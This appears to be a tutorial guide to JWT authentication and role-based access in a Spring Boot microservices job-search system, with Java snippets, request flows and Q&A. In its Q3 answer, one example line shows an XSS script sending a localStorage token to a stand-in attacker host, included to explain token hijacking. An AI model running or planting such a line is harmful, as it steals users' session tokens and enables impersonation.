# Step 6: Authentication & Authorization Theory (`auth-service`) — Complete Conceptual & Spring Boot Architecture Guide

> [!NOTE]
> **Purpose of This Document:** Before designing the formal Gate 1 API blueprint (`STEP_6_AUTH_SERVICE_GUIDE.md`) and generating code, this document walks through every security concept, microservices flow, Spring Boot folder/class responsibility, cross-file reference, and real-world scenario—so you have 100% clarity on how security works end-to-end.

---

## 1. Core Security Foundations

### A. Authentication vs. Authorization

| Concept | Core Question | Airport Analogy | HTTP Status on Failure |
| :--- | :--- | :--- | :--- |
| **Authentication** | **"Who are you?"** | Showing your **Passport** at security check to prove your identity. | **`401 Unauthorized`** (Not logged in, wrong password, expired/tampered token) |
| **Authorization** | **"What are you allowed to do?"** | Your **Boarding Pass** deciding whether you can enter First Class, Economy, or the Pilot Cockpit. | **`403 Forbidden`** (Valid identity, but wrong role—e.g. a `JOB_SEEKER` trying to delete a job) |

### B. Role-Based Access Control (RBAC) in JSS
In our Job Search System, every authenticated user holds a specific role (`EMPLOYER` or `JOB_SEEKER`):

* **Public / Non-Protected Routes** (Anyone can access without logging in):
  * `POST /api/auth/register` & `POST /api/auth/login` *(Users must be able to reach these to obtain a token!)*
  * `GET /api/jobs`, `GET /api/jobs/{id}`, `GET /api/jobs/search` *(Visitors browsing open jobs before signing up)*
  * `/swagger-ui.html`, `/api-docs/**` *(Interactive API documentation)*
* **Protected Routes — Role: `EMPLOYER` only:**
  * `POST /api/jobs`, `PUT /api/jobs/{id}`, `DELETE /api/jobs/{id}`
  * `GET /api/applications/job/{jobId}`, `PATCH /api/applications/{id}/status` *(Shortlisting/rejecting candidates)*
* **Protected Routes — Role: `JOB_SEEKER` only:**
  * `POST /api/applications`, `DELETE /api/applications/{id}` *(Applying / withdrawing applications)*
  * `GET /api/applications/jobseeker/{jobSeekerId}`
* **Protected Routes — Any Authenticated User (`EMPLOYER` or `JOB_SEEKER`):**
  * `POST /api/messages`, `GET /api/messages/conversation` *(Two-way messaging)*
  * `GET /api/auth/me` *(View current logged-in user details)*

### C. Why Passwords Are Always Hashed with BCrypt
Never store plaintext passwords (`"Pass@123"`) or reversible encrypted passwords in MySQL. If `auth_db` is ever leaked, attackers would immediately know every user's password across all websites.

**`BCryptPasswordEncoder`** solves this with **One-Way Adaptive Hashing + Random Salt**:
* Input: `"Sathish@123"` $\longrightarrow$ Stored in MySQL: `"$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy"`
* **Random Salt:** Even if two users choose `"Pass@123"`, BCrypt generates two completely different 60-character hashes.
* **One-Way:** It is mathematically impossible to reverse-engineer `"$2a$10$..."` back into `"Sathish@123"`.
* **Verification on Login:** Spring does not "decrypt" the password. Instead, `passwordEncoder.matches(rawPassword, storedHash)` extracts the salt from `storedHash`, hashes the incoming raw password with that same salt, and checks whether the two outputs match.

---

## 2. Stateful Sessions vs. Stateless JWT in Microservices

### Why Traditional Sessions Fail in Microservices
In a traditional single-server monolith:
1. User logs in $\rightarrow$ server creates a session in its local RAM (`Map["session_99"] = User 1`) and sends `Cookie: JSESSIONID=session_99` to the browser.
2. **Why this breaks in JSS:** If a user logs into **`auth-service` (Port 8081)**, that session sits inside `auth-service`'s JVM memory. When the user next calls **`job-service` (Port 8084)** or **`api-gateway` (Port 8080)**, those services cannot read `auth-service`'s RAM!

### The Microservices Solution: Stateless JWT (JSON Web Token)
With **JWT**, **zero session state is stored in server memory**:
1. When you log in to `auth-service`, it creates a **digitally signed token** containing your identity (`userId`, `email`/`username`, `role`) and signs it using a private **Secret Key (`HMAC-SHA256`)**.
2. The client stores this JWT and sends it on every future API request inside the HTTP Header:
   ```http
   Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjEsInJvbGUiOiJFTVBMT1lFUiJ9...
   ```
3. Any service (like **`api-gateway` in Step 7** or **`auth-service`**) that knows the **same Secret Key** can mathematically verify the token's signature in microseconds—with no database lookup and no shared RAM!

### Anatomy of a JWT (`Header.Payload.Signature`)
A JWT is three Base64Url-encoded strings separated by dots (`.`):

```text
eyJhbGciOiJIUzI1NiJ9  .  eyJ1c2VySWQiOjEsInN1YiI6InNhdGhpc2giLCJyb2xlIjoiRU1QTE9ZRVIifQ  .  SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
└─────── Header ─────┘  └───────────────────────── Payload (Claims) ──────────────────────┘  └─────────────── Signature ─────────────────┘
```

1. **Header:** Algorithm & token type: `{"alg": "HS256", "typ": "JWT"}`
2. **Payload (Claims):** Non-sensitive user metadata:
   ```json
   {
     "userId": 1,
     "sub": "hr@capgemini.com",
     "role": "EMPLOYER",
     "iat": 1795600000,
     "exp": 1795686400
   }
   ```
   > [!CAUTION]
   > **Never store passwords or sensitive secrets inside JWT Payload!** Base64 is encoding, not encryption—anyone who intercepts a JWT can decode the Payload JSON. Security comes from the **Signature**, which prevents tampering.
3. **Signature:** Computed as:
   $$\text{HMACSHA256}\big(\text{Base64Url}(\text{Header}) + \text{"."} + \text{Base64Url}(\text{Payload}),\; \text{SECRET\_KEY}\big)$$
   If a hacker intercepts the token and edits `"role": "JOB_SEEKER"` to `"role": "EMPLOYER"`, their recalculated signature will **not match** the signature created with our secret key—so Spring rejects the token immediately (`401 Unauthorized`).

---

## 3. How Step 6 (`auth-service`) + Step 7 (`api-gateway`) Work Together

Understanding how the whole JSS ecosystem integrates is essential before writing a single line of code:

```mermaid
sequenceDiagram
    autonumber
    actor Client as Frontend / Bruno / Swagger
    participant Gateway as API Gateway (Port 8080 - Step 7)
    participant Auth as Auth Service (Port 8081 - Step 6)
    participant AuthDB as MySQL (auth_db)
    participant Job as Job Service (Port 8084)

    Note over Client,Auth: Phase 1: Login (Public / Non-Protected Route)
    Client->>Gateway: POST /api/auth/login {usernameOrEmail, password}
    Gateway->>Auth: Route to auth-service (Public route allowed)
    Auth->>AuthDB: Fetch user & check BCrypt password hash
    AuthDB-->>Auth: Matched! (userId: 1, role: EMPLOYER)
    Auth-->>Client: 200 OK { token: "eyJhbGci...", role: "EMPLOYER" }

    Note over Client,Job: Phase 2: Accessing Protected Route with Bearer Token
    Client->>Gateway: POST /api/jobs {Header: Authorization: Bearer eyJhbGci...}
    Gateway->>Gateway: Validate JWT Signature, Expiry & Role via Secret Key
    alt Missing, Expired, or Tampered Token
        Gateway-->>Client: 401 Unauthorized
    else Role is JOB_SEEKER (Not EMPLOYER)
        Gateway-->>Client: 403 Forbidden
    else Valid EMPLOYER Token
        Gateway->>Job: Forward request + X-User-Id / X-User-Role headers
        Job-->>Client: 201 Created (Job Published!)
    end
```

### Two Patterns for JWT Validation in Microservices
1. **Centralized Gateway Validation (Recommended & Cleanest for Steps 6 & 7):**
   * `auth-service` (8081) owns user accounts (`auth_db`), BCrypt password verification, JWT generation, and token validation.
   * `api-gateway` (8080, built in Step 7) sits in front of ALL services (`employer-service`, `jobseeker-service`, `job-service`, `application-service`, `messaging-service`). Every request enters through `8080`, where the Gateway's `JwtAuthenticationFilter` verifies the Bearer token and checks the route's required Role **before** routing downstream!
   * **Why this is great for our project:** We do NOT have to duplicate Spring Security dependencies and JWT filters inside 5 already-built microservices (`employer`, `jobseeker`, `job`, `application`, `messaging`)—yet when accessed via Gateway `8080`, the entire platform is protected!
2. **Self-Protection Inside `auth-service` (8081):**
   * `auth-service` itself also runs Spring Security + its own `JwtAuthenticationFilter` so that even direct calls to protected `auth-service` endpoints (like `GET /api/auth/me` or `GET /api/auth/users/{id}`) are fully secured by Bearer token and RBAC!

---

## 4. Spring Boot Anatomy: Exact Folders, Files & Where Each Is Referenced

A frequent question in Spring Boot is: *"Does JWT logic live in the Controller, Service, Repository, or its own folder?"*

**Answer:** Security and JWT logic live in **two dedicated layers** alongside `controller`, `service`, and `repository`:
1. **`security/` package:** Low-level JWT creation/parsing, HTTP filter interception, and Spring Security user loading.
2. **`config/` package:** Global Spring Security wiring (`SecurityFilterChain`, `PasswordEncoder`, `AuthenticationManager`).

### Exact Folder Structure for `auth-service`

```text
src/main/java/com/jss/auth/
├── AuthServiceApplication.java
├── config/                                  <-- [1] SPRING WIRING & BEANS
│   ├── SecurityConfig.java                  <-- Configures public vs protected URLs, stateless policy, BCrypt, Filter
│   └── OpenApiConfig.java                   <-- Adds Swagger "Authorize (Bearer JWT)" button!
├── security/                                <-- [2] DEDICATED JWT & SPRING SECURITY ENGINE
│   ├── JwtUtil.java                         <-- Builds, signs, parses, and validates JWT strings
│   ├── CustomUserDetailsService.java        <-- Bridges UserRepository -> Spring Security UserDetails
│   ├── JwtAuthenticationFilter.java         <-- Runs ONCE per HTTP request to read Bearer token
│   ├── JwtAuthenticationEntryPoint.java     <-- Returns clean 401 JSON when unauthenticated
│   └── CustomAccessDeniedHandler.java       <-- Returns clean 403 JSON when Role is forbidden
├── controller/                              <-- [3] THIN HTTP LAYER
│   └── AuthController.java                  <-- /api/auth/register, /login, /validate, /me
├── service/                                 <-- [4] BUSINESS LOGIC LAYER
│   ├── AuthService.java
│   └── impl/AuthServiceImpl.java            <-- Uses PasswordEncoder, AuthenticationManager, JwtUtil
├── repository/                              <-- [5] DATABASE LAYER
│   └── UserRepository.java                  <-- Queries MySQL 'auth_db.users'
├── entity/
│   └── User.java                            <-- User entity (userId, username, password, email, role, status, dates)
├── dto/                                     <-- RegisterRequestDTO, LoginRequestDTO, AuthResponseDTO, UserResponseDTO
└── exception/                               <-- DuplicateUserException, InvalidCredentialsException, etc.
```

---

### How Each Security File Works & Where It Is Referenced (With Code Snippets)

#### File 1: `security/JwtUtil.java` (`@Component`)
* **Job:** Pure cryptography & JWT handling (using `io.jsonwebtoken` / `jjwt` library). Does NOT touch databases or HTTP requests.
* **Functions inside:**
  1. `generateToken(User user)`: Packs `userId`, `username`, `role` into claims, sets expiration (`24 hours`), signs with `SECRET_KEY`.
  2. `extractUsername(String token)`: Reads `sub` claim from token.
  3. `extractRole(String token)`: Reads `role` claim from token.
  4. `validateToken(String token)`: Checks signature integrity and confirms token is not expired.
* **Where it is referenced:**
  * Injected into **`AuthServiceImpl`** $\rightarrow$ called on `login()` to mint a new JWT.
  * Injected into **`JwtAuthenticationFilter`** $\rightarrow$ called on every protected request to verify the incoming Bearer token.
  * Injected into **`AuthServiceImpl.validateToken()`** $\rightarrow$ if `/api/auth/validate` endpoint is called.

```java
@Component
public class JwtUtil {

    @Value("${jwt.secret}")
    private String secretKey;

    @Value("${jwt.expiration}") // e.g., 86400000 ms (24 hours)
    private long jwtExpirationMs;

    public String generateToken(User user) {
        Map<String, Object> claims = new HashMap<>();
        claims.put("userId", user.getUserId());
        claims.put("role", user.getRole()); // "EMPLOYER" or "JOB_SEEKER"

        return Jwts.builder()
                .claims(claims)
                .subject(user.getUsername())
                .issuedAt(new Date())
                .expiration(new Date(System.currentTimeMillis() + jwtExpirationMs))
                .signWith(getSigningKey()) // HMAC-SHA256
                .compact();
    }

    public String extractUsername(String token) {
        return extractAllClaims(token).getSubject();
    }

    public boolean validateToken(String token) {
        Jwts.parser().verifyWith(getSigningKey()).build().parseSignedClaims(token);
        return true; // Throws JwtException if expired or tampered
    }
}
```

---

#### File 2: `security/CustomUserDetailsService.java` (`@Service`)
* **Job:** Spring Security does not know what our custom `User.java` entity is—it only understands its own interface `org.springframework.security.core.userdetails.UserDetails`. This class acts as the **Translator / Adapter** between our `UserRepository` and Spring Security!
* **Functions inside:**
  * `loadUserByUsername(String usernameOrEmail)`: Queries `userRepository.findByUsernameOrEmail(...)`, verifies the user is `ACTIVE`, and converts `user.getRole()` (`"EMPLOYER"`) into `new SimpleGrantedAuthority("ROLE_EMPLOYER")`.
* **Where it is referenced:**
  * Automatically picked up by Spring Security's **`AuthenticationManager`** inside **`SecurityConfig`** during `login()`.
  * Injected into **`JwtAuthenticationFilter`** to load the user's roles/authorities onto the request context.

```java
@Service
@RequiredArgsConstructor
public class CustomUserDetailsService implements UserDetailsService {

    private final UserRepository userRepository;

    @Override
    public UserDetails loadUserByUsername(String usernameOrEmail) throws UsernameNotFoundException {
        User user = userRepository.findByUsernameOrEmail(usernameOrEmail, usernameOrEmail)
                .orElseThrow(() -> new UsernameNotFoundException("User not found: " + usernameOrEmail));

        // Prefix with "ROLE_" so Spring Security @PreAuthorize("hasRole('EMPLOYER')") works seamlessly
        GrantedAuthority authority = new SimpleGrantedAuthority("ROLE_" + user.getRole());

        return new org.springframework.security.core.userdetails.User(
                user.getUsername(),
                user.getPassword(), // BCrypt hashed password from MySQL
                "ACTIVE".equalsIgnoreCase(user.getStatus()),
                true, true, true,
                Collections.singletonList(authority)
        );
    }
}
```

---

#### File 3: `security/JwtAuthenticationFilter.java` (`@Component`, extends `OncePerRequestFilter`)
* **Job:** The **"Bouncer at the Door"**. Runs **once for every incoming HTTP request** BEFORE it reaches `AuthController`.
* **Execution Steps inside `doFilterInternal(...)`:**
  1. Reads HTTP header `Authorization`.
  2. If header is missing or doesn't start with `"Bearer "`, passes the request down the chain *unauthenticated* (`filterChain.doFilter(request, response)`). *(If the URL is public like `/login`, it succeeds! If the URL is protected like `/me`, Spring blocks it right after with `401`!).*
  3. Strips `"Bearer "` (first 7 characters) to isolate the JWT string.
  4. Calls `jwtUtil.validateToken(token)` and extracts `username`.
  5. Calls `userDetailsService.loadUserByUsername(username)` to get the `UserDetails` + Role.
  6. Creates an authenticated `UsernamePasswordAuthenticationToken` and stores it inside **`SecurityContextHolder.getContext().setAuthentication(authToken)`**.
* **Where it is referenced:**
  * Registered inside **`SecurityConfig.securityFilterChain(...)`** using `.addFilterBefore(jwtAuthenticationFilter, UsernamePasswordAuthenticationFilter.class)`.

```java
@Component
@RequiredArgsConstructor
public class JwtAuthenticationFilter extends OncePerRequestFilter {

    private final JwtUtil jwtUtil;
    private final CustomUserDetailsService userDetailsService;

    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                    HttpServletResponse response,
                                    FilterChain filterChain) throws ServletException, IOException {

        String authHeader = request.getHeader("Authorization");

        if (authHeader != null && authHeader.startsWith("Bearer ")) {
            String token = authHeader.substring(7); // Remove "Bearer " prefix
            try {
                if (jwtUtil.validateToken(token)) {
                    String username = jwtUtil.extractUsername(token);
                    UserDetails userDetails = userDetailsService.loadUserByUsername(username);

                    UsernamePasswordAuthenticationToken authToken =
                            new UsernamePasswordAuthenticationToken(
                                    userDetails, null, userDetails.getAuthorities());
                    authToken.setDetails(new WebAuthenticationDetailsSource().buildDetails(request));

                    // Tell Spring Security: "This user is authenticated for this HTTP request!"
                    SecurityContextHolder.getContext().setAuthentication(authToken);
                }
            } catch (Exception ex) {
                // Invalid/expired token: leave SecurityContext empty -> EntryPoint returns 401
            }
        }
        filterChain.doFilter(request, response);
    }
}
```

---

#### File 4: `config/SecurityConfig.java` (`@Configuration @EnableWebSecurity @EnableMethodSecurity`)
* **Job:** The **Master Security Switchboard**. Connects every component together.
* **Beans defined here & where they are referenced:**
  1. `PasswordEncoder` (`BCryptPasswordEncoder`) $\rightarrow$ Referenced in `AuthServiceImpl` (hashes password on register) & Spring's `DaoAuthenticationProvider` (verifies password on login).
  2. `AuthenticationManager` $\rightarrow$ Referenced in `AuthServiceImpl.login(...)`.
  3. `SecurityFilterChain` $\rightarrow$ Used automatically by Spring Boot on startup to guard all HTTP URLs:
     * `.csrf(csrf -> csrf.disable())` *(Disabled because REST APIs using stateless Bearer headers are immune to browser Cookie CSRF attacks).*
     * `.sessionManagement(sm -> sm.sessionCreationPolicy(SessionCreationPolicy.STATELESS))` *(Never create HTTP sessions in RAM).*
     * `.authorizeHttpRequests(...)`:
       * `.requestMatchers("/api/auth/register", "/api/auth/login", "/api/auth/validate", "/swagger-ui/**", "/api-docs/**").permitAll()` *(Non-protected routes)*
       * `.anyRequest().authenticated()` *(Everything else—like `/api/auth/me` or `/api/auth/employer-only`—requires a valid Bearer JWT!)*
     * `.exceptionHandling(...)` $\rightarrow$ Plugs in `JwtAuthenticationEntryPoint` (`401`) & `CustomAccessDeniedHandler` (`403`) so errors return clean JSON matching our 5-field `ErrorResponse`!
     * `.addFilterBefore(jwtAuthenticationFilter, UsernamePasswordAuthenticationFilter.class)`

---

#### File 5: `service/impl/AuthServiceImpl.java` & `controller/AuthController.java`
Notice how clean `AuthController` and `AuthServiceImpl` remain because all filtering lives inside `security/` and `config/`:

* **`AuthServiceImpl`:**
  * `register(RegisterRequestDTO)`: Checks if `username` or `email` already exists $\rightarrow$ encodes password via `passwordEncoder.encode(rawPassword)` $\rightarrow$ saves `User` to `auth_db` $\rightarrow$ generates JWT (or returns user summary).
  * `login(LoginRequestDTO)`: Calls `authenticationManager.authenticate(new UsernamePasswordAuthenticationToken(loginDto.getUsernameOrEmail(), loginDto.getPassword()))`.
    * Behind the scenes, Spring calls `CustomUserDetailsService` + `BCryptPasswordEncoder.matches(...)`.
    * If password is wrong $\rightarrow$ Spring throws `BadCredentialsException` $\rightarrow$ caught by `GlobalExceptionHandler` $\rightarrow$ returns **`401 Unauthorized`**.
    * If password matches $\rightarrow$ calls `jwtUtil.generateToken(user)` and returns `AuthResponseDTO` with the JWT!
* **`AuthController`:**
  * Simply receives DTOs (`@Valid @RequestBody`), delegates to `AuthService`, and uses `@PreAuthorize("hasRole('EMPLOYER')")` where method-level role protection is needed!

---

## 5. Four Real-World Execution Scenarios (End-to-End Trace)

### Scenario 1: Employer Registers (`POST /api/auth/register`) — *Public Route*
1. Request hits `JwtAuthenticationFilter` $\rightarrow$ No `Authorization` header $\rightarrow$ passes through because `/api/auth/register` is `.permitAll()`.
2. `AuthController.register(...)` validates DTO (`@NotBlank`, `@Email`, `@Pattern(regexp = "^(EMPLOYER|JOB_SEEKER)$")`).
3. `AuthServiceImpl` checks `UserRepository` for duplicate username/email (throws `409 Conflict` if duplicate).
4. `passwordEncoder.encode("Capgemini@123")` turns it into `$2a$10$...` hash.
5. Saves `User` row into MySQL `auth_db.users` with `status = "ACTIVE"`. Returns `201 Created`.

### Scenario 2: User Logs In (`POST /api/auth/login`) — *Public Route*
1. Request enters `/api/auth/login` with `{"usernameOrEmail": "hr@capgemini.com", "password": "Capgemini@123"}`.
2. `AuthServiceImpl` passes credentials to `AuthenticationManager.authenticate(...)`.
3. `AuthenticationManager` calls `CustomUserDetailsService.loadUserByUsername("hr@capgemini.com")` $\rightarrow$ fetches hashed user from MySQL.
4. `BCryptPasswordEncoder.matches("Capgemini@123", "$2a$10$...")` returns `true`!
5. `JwtUtil.generateToken(user)` generates `eyJhbGciOiJIUzI1NiJ9...` valid for 24 hours.
6. Returns `200 OK` with `{ "token": "eyJhbGci...", "tokenType": "Bearer", "userId": 1, "username": "capgemini_hr", "role": "EMPLOYER" }`.

### Scenario 3: Accessing Protected Endpoint (`GET /api/auth/me`) — *Protected Route*
1. Client sends `GET /api/auth/me` with header `Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...`.
2. **`JwtAuthenticationFilter` runs BEFORE controller:**
   * Extracts JWT $\rightarrow$ verifies HMAC-SHA256 signature with Secret Key & checks expiration $\rightarrow$ pulls `"capgemini_hr"`.
   * Loads `UserDetails` with authority `ROLE_EMPLOYER`.
   * Sets `SecurityContextHolder`!
3. Spring's `AuthorizationFilter` checks rule `.anyRequest().authenticated()` $\rightarrow$ sees user inside `SecurityContextHolder` $\rightarrow$ **ALLOWED!**
4. `AuthController.getCurrentUser(Authentication auth)` reads `auth.getName()` and returns profile (`200 OK`).

### Scenario 4: Security Rejections (`401 Unauthorized` vs `403 Forbidden`)
* **Case 4A (Missing / Expired / Tampered Token):**
  Client calls `GET /api/auth/me` without header or with corrupted token `Bearer xyz123`.
  `JwtAuthenticationFilter` leaves `SecurityContextHolder` empty $\rightarrow$ `JwtAuthenticationEntryPoint` intercepts and returns:
  **`401 Unauthorized`**: `{"status": 401, "error": "Unauthorized", "message": "Authentication is required or token is invalid/expired"}`.
* **Case 4B (Valid Token, Wrong Role!):**
  Candidate logged in (`role: "JOB_SEEKER"`, valid token!) tries to call an endpoint protected with `@PreAuthorize("hasRole('EMPLOYER')")` (e.g., an employer-only dashboard or `POST /api/jobs` through API Gateway).
  `JwtAuthenticationFilter` authenticates the candidate (`ROLE_JOB_SEEKER` is put in `SecurityContextHolder`).
  Spring checks `hasRole('EMPLOYER')` $\rightarrow$ FAILS!
  `CustomAccessDeniedHandler` intercepts and returns:
  **`403 Forbidden`**: `{"status": 403, "error": "Forbidden", "message": "Access Denied: You do not have permission (EMPLOYER role required)"}`.

---

## 6. How Swagger UI Works With JWT
Inside `config/OpenApiConfig.java`, we add `@SecurityScheme(name = "JWT AUTHORIZATION", type = SecuritySchemeType.HTTP, scheme = "bearer", bearerFormat = "JWT")`.
* This automatically renders an **"Authorize"** button labeled **`JWT AUTHORIZATION`** at the top of `http://localhost:8081/swagger-ui.html`.
* You log in once via `/api/auth/login`, copy the JWT, click **Authorize**, paste it into the `JWT AUTHORIZATION` box, and Swagger automatically attaches `Authorization: Bearer <token>` to every endpoint test you click!

---

## 7. Conceptual Q&A & Deep-Dives

### Q1: Who creates the session & cookie, what is "Server Local RAM", and how do Cookies compare to `localStorage`?
* **"Server creates a session in local RAM":** Here, "local RAM" means the **Backend Server's own memory** (Spring Boot / Node.js JVM/process RAM on the server), **NOT** the user's browser!
* **"Who sends the cookie to the browser?":** The **Backend Server** sends an HTTP Response Header:
  ```http
  Set-Cookie: JSESSIONID=session_99; HttpOnly; Secure
  ```
  Chrome/Edge reads `Set-Cookie` and saves it inside the browser's Cookie storage automatically.
* **Cookie (`HttpOnly`) vs `localStorage` / `sessionStorage`:**
  * **`localStorage` / `sessionStorage`:** Readable by frontend JavaScript (`localStorage.getItem("token")`). Vulnerable if a malicious script (XSS) runs on the page.
  * **`HttpOnly` Cookie:** Set by the Backend Server; **invisible to JavaScript (`document.cookie`)** so XSS scripts cannot read it, and automatically attached by Chrome on outgoing API calls to that server.

---

### Q2: In a Monolith storing Access + Refresh Tokens in Cookies with Middleware, is it Stateful or Stateless?
* **Transport vs. Authentication Mechanism:** Storing a JWT in an `HttpOnly` Cookie vs. sending it in an `Authorization: Bearer` header is only the **delivery envelope**—it does not decide stateful vs. stateless!
* **Classic Stateful Session (`JSESSIONID=session_99`):** The cookie contains only a random lookup ID. All user identity lives in a `Map` inside **Server RAM** (or Redis). The server *must* remember logged-in users (`state`). If the server restarts, RAM clears and everyone is logged out.
* **Your Monolith (Access Token JWT in Cookie + Middleware):**
  * **Access Token verification is 100% STATELESS!** The middleware checks the JWT's cryptographic signature using `SECRET_KEY`—no `Map` in server RAM is needed.
  * **Refresh Token:** Typically **Stateful** only when refreshing (if stored in a DB table to support revocation / "Log out everywhere"), or stateless if unpersisted.

---

### Q3: What does "someone intercepts/decodes a JWT" mean in real life, and what can they see?
* **How an attacker gets the token:**
  1. **XSS Attack on `localStorage`:** A compromised npm script or comment runs `fetch("https://evil.com?t=" + localStorage.getItem("token"))`.
  2. **Network Sniffing (non-HTTPS Wi-Fi)**, leaked server logs, or opening Chrome DevTools (`F12`) on an unlocked laptop.
* **How they decode it in 2 seconds (no secret key required!):**
  Paste the middle Payload string `eyJ1c2VySWQiOjEsInN1YiI6InNhdGhpc2giLCJyb2xlIjoiRU1QTE9ZRVIifQ` into `jwt.io` or run `atob(...)` in a browser console $\rightarrow$ prints `{"userId":1,"sub":"sathish","role":"EMPLOYER"}`.
* **What they CAN and CANNOT do:**
  * If a developer mistakenly put `"password"` or `"aadharNumber"` in the Payload, the attacker reads it immediately. **Rule:** Never put sensitive secrets in JWT claims!
  * They **CANNOT** change `"role": "JOB_SEEKER"` to `"EMPLOYER"`, because changing even 1 letter breaks the Part 3 Signature (they lack `SECRET_KEY`).
  * **Real Risk (Token Hijacking):** If stolen while valid, the attacker can impersonate that user until `exp` expires—which is why short expiration (`exp`), `HTTPS`, and `HttpOnly` cookies matter.

---

### Q4: How do the 3 parts of a JWT (`Header.Payload.Signature`) work during signing & verification?
* Yes! `eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQi...SflKxwRJS...` is the **final signed output** produced by `JwtUtil`.
* The literal text `"HMACSHA256(...)"` is **not** inside the token—it is the **recipe** run on the backend:
  1. **Creation:** Read `Header` (`{"alg":"HS256","typ":"JWT"}`) $\rightarrow$ Base64Url(`part1`) + Base64Url(`Payload`=`part2`) $\rightarrow$ run `HMACSHA256(part1 + "." + part2, SECRET_KEY)` $\rightarrow$ Base64Url encode result = `part3`. Output: `part1.part2.part3`.
  2. **Verification:** When the token comes back, the backend reads `"alg": "HS256"` from `part1`, re-runs `HMACSHA256(part1 + "." + part2, SECRET_KEY)` itself, and compares whether its computed signature matches `part3`!

---

### Q5: Is Spring's `JwtAuthenticationFilter` the same thing as "Middleware" in Node/Express?
* **YES, 100%!**
* In Node.js/Express you call `authMiddleware(req, res, next)` and finish with `next()`.
* In Spring Boot / Spring Cloud Gateway you call `JwtAuthenticationFilter` (`doFilterInternal(req, res, filterChain)`) and finish with `filterChain.doFilter(req, res)`—exact same concept under a Java name (`Filter`).

---

## Next Step: Moving to Gate 1 Blueprint (`STEP_6_AUTH_SERVICE_GUIDE.md`)
Once every piece of this theory and Spring Boot architecture makes complete sense, let me know your questions—or say **"ready for Gate 1 guide"**—and we will create `STEP_6_AUTH_SERVICE_GUIDE.md` to decide the exact endpoints, entity columns, exceptions, and RBAC rules before writing code!
